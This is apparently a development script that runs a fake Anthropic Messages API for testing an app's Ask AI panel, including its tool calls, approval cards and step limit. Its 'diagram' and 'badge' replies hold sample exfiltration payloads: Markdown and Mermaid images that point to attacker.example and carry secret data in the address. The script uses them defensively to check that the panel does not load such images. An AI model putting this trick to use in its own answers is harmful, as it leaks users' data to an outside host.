// A stand-in for the Anthropic Messages API, for click-through tests of Ask AI without a real key or model.
// Run: bun scripts/assistant-fake-model.ts [port]   (listens on 127.0.0.1 only)
// Then start a development server with ORBIT_ENV=development ORBIT_DEV_AI_ANTHROPIC_BASE_URL=http://127.0.0.1:<port>
// (the server ignores the base URL outside development) and save any key that starts with sk-ant- in Settings → AI;
// the key sk-ant-fake-invalid-key is refused, to test that path.
//
// It answers from the conversation it is sent, like a tiny scripted model:
// - "create a task <title>": list_projects, then list_task_statuses, then create_task (which waits for approval),
//   then a confirmation, or "I did not create it" after a decline;
// - "open docs": open_page /docs;  "show projects": list_projects;  "badge": an answer with an outside image;
//   "diagram": a Mermaid block with an outside image node; "rename project to X": list_projects, then update_project
//   (a structured change, which "Allow in this chat" may cover); "move GEN-2 to In Progress": get_task,
//   list_task_statuses, then update_task (an approval with before → after); "tasks" / "open tasks": list_tasks, then an
//   answer that quotes the totals Orbit worked out and names a few task keys (chips); "show GEN-1": get_task;
//   "list docs": list_docs; "move GEN-2 to In Progress, then keep reading": the change, then get_task again and again
//   until Orbit's step limit stops the run (its summary card must still show); anything else: an echo.

const port = Number(process.argv[2] ?? 18_960)
/** Optional pause before each answer (ms), so a recording looks like a real model at work. */
const delay = Number(process.env.FAKE_MODEL_DELAY_MS ?? 0)

type Block = { type: string; text?: string; content?: string; tool_use_id?: string; name?: string; id?: string; input?: unknown }
type Message = { role: string; content: string | Block[] }

function sse(events: unknown[]): Response {
  const body = events.map((event) => `event: ${(event as { type: string }).type}\ndata: ${JSON.stringify(event)}\n\n`).join('')
  return new Response(body, { headers: { 'content-type': 'text/event-stream' } })
}

function turn(blocks: Block[], stop: string): Response {
  const events: unknown[] = [{ type: 'message_start', message: { model: 'claude-sonnet-5-5', usage: { input_tokens: 1200, output_tokens: 1, cache_read_input_tokens: 800 } } }]
  blocks.forEach((block, index) => {
    if (block.type === 'text') {
      events.push({ type: 'content_block_start', index, content_block: { type: 'text', text: '' } })
      for (const word of (block.text ?? '').split(/(?<= )/)) events.push({ type: 'content_block_delta', index, delta: { type: 'text_delta', text: word } })
    } else {
      events.push({ type: 'content_block_start', index, content_block: { type: 'tool_use', id: block.id, name: block.name, input: {} } })
      events.push({ type: 'content_block_delta', index, delta: { type: 'input_json_delta', partial_json: JSON.stringify(block.input) } })
    }
    events.push({ type: 'content_block_stop', index })
  })
  events.push({ type: 'message_delta', delta: { stop_reason: stop }, usage: { output_tokens: 42 } })
  events.push({ type: 'message_stop' })
  return sse(events)
}

const say = (text: string) => turn([{ type: 'text', text }], 'end_turn')
let calls = 0
const call = (name: string, input: unknown, text?: string) =>
  turn([...(text ? [{ type: 'text', text }] : []), { type: 'tool_use', id: `toolu_fake_${++calls}`, name, input }], 'tool_use')

/** The JSON inside a wrapped tool result. */
function unwrap(content: string): unknown {
  // the tool output sits inside the tag; Orbit may add a note after it
  const inner = content.replace(/^<untrusted-data-[0-9a-f]+[^>]*>\n?/, '').replace(/\n?<\/untrusted-data-[0-9a-f]+>[\s\S]*$/, '')
  try {
    return JSON.parse(inner)
  } catch {
    return null
  }
}

/** The output of the last call of `tool` in the conversation. */
function resultOf(messages: Message[], tool: string): unknown {
  let id: string | undefined
  let output: unknown = null
  for (const message of messages) {
    if (typeof message.content === 'string') continue
    for (const block of message.content) {
      if (block.type === 'tool_use' && block.name === tool) id = block.id
      if (block.type === 'tool_result' && id && block.tool_use_id === id) output = unwrap(block.content ?? '')
    }
  }
  return output
}

function firstId(value: unknown): string | undefined {
  const record = value as Record<string, unknown> | null
  const list = Array.isArray(value) ? value : (['items', 'projects', 'statuses', 'data'].map((key) => record?.[key]).find(Array.isArray) as unknown[] | undefined)
  return (list?.[0] as { id?: string } | undefined)?.id
}

function answer(messages: Message[]): Response {
  const userTexts = messages.filter((m) => m.role === 'user').flatMap((m) => (typeof m.content === 'string' ? [m.content] : m.content.filter((b) => b.type === 'text').map((b) => b.text ?? '')))
  const typed = userTexts.filter((text) => !text.startsWith('<page-context>') && !text.startsWith('(Automatic check')).pop() ?? ''
  // "…, then keep reading": after the change, read on until the step limit
  const keepReading = /,?\s*then keep reading\.?$/i.test(typed)
  const asked = typed.replace(/,?\s*then keep reading\.?$/i, '')
  const last = messages[messages.length - 1]
  const results = typeof last.content === 'string' ? [] : last.content.filter((b) => b.type === 'tool_result')
  const previous = messages[messages.length - 2]
  const calledName = (id?: string) => (typeof previous?.content === 'string' ? undefined : previous?.content.find((b) => b.id === id)?.name)
  if (results.length && results.every((r) => calledName(r.tool_use_id))) {
    const result = results[results.length - 1]
    const name = calledName(result.tool_use_id)
    const content = result.content ?? ''
    if (/declined/i.test(content)) return say('OK, I did not create it.')
    const changed = resultOf(messages, 'update_task')
    const reading = asked.match(/move ([A-Z][A-Z0-9]*-\d+) to /i)
    if (keepReading && changed && reading) return call('get_task', { task_id: reading[1].toUpperCase() }, 'Reading it once more.')
    // "Move ENG-2 to In Progress": read the task, read its project's statuses, change the status with a card
    const move = asked.match(/move ([A-Z][A-Z0-9]*-\d+) to (.+?)\.?$/i)
    if (move) {
      const task = resultOf(messages, 'get_task') as { id?: string; project_id?: string; status_id?: string; version?: number } | null
      const statuses = (resultOf(messages, 'list_task_statuses') as { items?: { id: string; name: string }[] } | null)?.items ?? []
      if (name === 'get_task') return task?.project_id ? call('list_task_statuses', { project_id: task.project_id }) : say(`I cannot find ${move[1]}.`)
      if (name === 'list_task_statuses') {
        const target = statuses.find((status) => status.name.toLowerCase() === move[2].trim().toLowerCase())
        if (!task?.id || !target) return say(`There is no status "${move[2].trim()}" in that project.`)
        return call('update_task', { task_id: task.id, expected_version: task.version ?? 1, status_id: target.id }, `I'll move ${move[1]} to ${target.name}. It needs your approval.`)
      }
      if (name === 'update_task') {
        const before = statuses.find((status) => status.id === task?.status_id)?.name
        return say(`Moved ${move[1]} to ${move[2].trim()}.${before ? ` It was ${before} before.` : ''}`)
      }
    }
    const rename = asked.match(/rename (?:the )?project to (.+)$/i)
    if (rename && name === 'list_projects') {
      const projects = unwrap(content) as { items?: { id: string; version?: number }[] } | { id: string; version?: number }[] | null
      const first = Array.isArray(projects) ? projects[0] : projects?.items?.[0]
      return first ? call('update_project', { project_id: first.id, expected_version: first.version ?? 1, name: rename[1].trim() }) : say('No project.')
    }
    if (name === 'update_project') return say(`Renamed to ${asked.match(/rename (?:the )?project to (.+)$/i)?.[1]?.trim() ?? 'that'}.`)
    if (/expired|NOT performed/i.test(content)) return say('That change was not made.')
    // "Create a task in Launch: Write the post" names the project; "Create a task: Write the post" takes the first one
    const named = asked.match(/create a task in ([^:]+):\s*(.+)$/i)
    const title = (named ? named[2] : asked.replace(/^.*?task:?\s*/i, '')).trim() || 'Task from Ask AI'
    if (name === 'list_projects' && /create a task/i.test(asked)) {
      const listed = unwrap(content) as { items?: { id: string; name: string }[] } | { id: string; name: string }[] | null
      const all = Array.isArray(listed) ? listed : (listed?.items ?? [])
      const project = (named && all.find((p) => p.name.toLowerCase() === named[1].trim().toLowerCase())?.id) || firstId(listed)
      return project ? call('list_task_statuses', { project_id: project }) : say('You have no project yet.')
    }
    if (name === 'list_task_statuses') {
      const projects = messages.flatMap((m) => (typeof m.content === 'string' ? [] : m.content)).filter((b) => b.type === 'tool_use' && b.name === 'list_task_statuses')
      const project = (projects[projects.length - 1]?.input as { project_id?: string })?.project_id
      const status = firstId(unwrap(content))
      return call('create_task', { project_id: project, status_id: status, title }, `I'll create the task "${title}". It needs your approval.`)
    }
    if (name === 'create_task') {
      const task = unwrap(content) as { identifier?: string } | null
      return say(`Created ${task?.identifier ?? 'the task'}.`)
    }
    if (name === 'list_tasks') {
      const listed = unwrap(content) as {
        items?: { identifier?: string; title?: string }[]
        totals?: { tasks: number; open: number; done: number; by_project?: Record<string, number>; by_status?: Record<string, number>; complete?: boolean }
      } | null
      const totals = listed?.totals
      if (!totals) return say('I could not count them.')
      const projects = Object.entries(totals.by_project ?? {}).map(([project, n]) => `- ${project}: ${n}`).join('\n')
      const keys = (listed?.items ?? []).map((item) => item.identifier).filter(Boolean).slice(0, 3)
      const page = totals.complete === false ? ' (first page only)' : ''
      return say(`You have **${totals.tasks} tasks**${page}: ${totals.open} open and ${totals.done} done.\n\n${projects}\n\nStart with ${keys.join(', ')}. Keys I did not look up, such as ZZZ-99, stay plain text, and so does \`${keys[0] ?? 'GEN-1'}\` in code.`)
    }
    if (name === 'get_task') {
      const task = unwrap(content) as { identifier?: string; title?: string } | null
      return say(`${task?.identifier ?? 'That task'} is "${task?.title ?? ''}".`)
    }
    if (name === 'list_docs') return say('Those are your docs.')
    // repeats what Orbit told it: with Follow along off the page was not opened
    if (name === 'open_page') return say(/Not opened: Follow along is off/.test(content) ? 'Follow along is off, so I did not open it: use the go there link.' : 'Here are your docs.')
    if (name === 'list_projects') return say('Those are your projects.')
    return say('Done looking.')
  }
  // an answer that tries to load an outside image with data in its address (the panel must not load it)
  if (/diagram/i.test(asked)) {
    return say('Status:\n```mermaid\nflowchart TD\n  A@{ img: "https://attacker.example/m.png?d=secret", label: "status", pos: "t", h: 60, constraint: "on" }\n```')
  }
  if (/badge/i.test(asked)) return say('Status ![ok](https://attacker.example/b.png?d=secret-task-titles) and [details](https://attacker.example/x?d=1)')
  const moveTask = asked.match(/move ([A-Z][A-Z0-9]*-\d+) to /i)
  if (moveTask) return call('get_task', { task_id: moveTask[1].toUpperCase() }, `Let me look at ${moveTask[1].toUpperCase()}.`)
  if (/rename (the )?project to/i.test(asked)) return call('list_projects', {})
  if (/create a task/i.test(asked)) return call('list_projects', {}, 'Let me look at your projects first.')
  if (/open (my )?docs/i.test(asked)) return call('open_page', { path: '/docs' })
  if (/list (my )?docs/i.test(asked)) return call('list_docs', {}, 'Let me look at your docs.')
  const showTask = asked.match(/^show ([A-Z][A-Z0-9]*-\d+)/i)
  if (showTask) return call('get_task', { task_id: showTask[1].toUpperCase() })
  if (/\btasks\b/i.test(asked)) return call('list_tasks', { limit: 100 }, 'Let me look up your tasks.')
  if (/projects/i.test(asked)) return call('list_projects', {})
  return say(`You said: ${asked}`)
}

Bun.serve({
  hostname: '127.0.0.1',
  port,
  async fetch(request) {
    const url = new URL(request.url)
    const key = request.headers.get('x-api-key') ?? ''
    if (key === 'sk-ant-fake-invalid-key') {
      return Response.json({ type: 'error', error: { type: 'authentication_error', message: 'invalid x-api-key' } }, { status: 401 })
    }
    if (url.pathname === '/v1/models') {
      return Response.json({ data: [{ id: 'claude-sonnet-5-5' }, { id: 'claude-opus-5-5' }, { id: 'claude-haiku-5-5' }] })
    }
    if (url.pathname === '/v1/messages' && request.method === 'POST') {
      const body = (await request.json()) as { messages: Message[] }
      if (delay > 0) await Bun.sleep(delay)
      return answer(body.messages)
    }
    return new Response('not found', { status: 404 })
  },
})
console.log(`fake Anthropic API on http://127.0.0.1:${port}`)
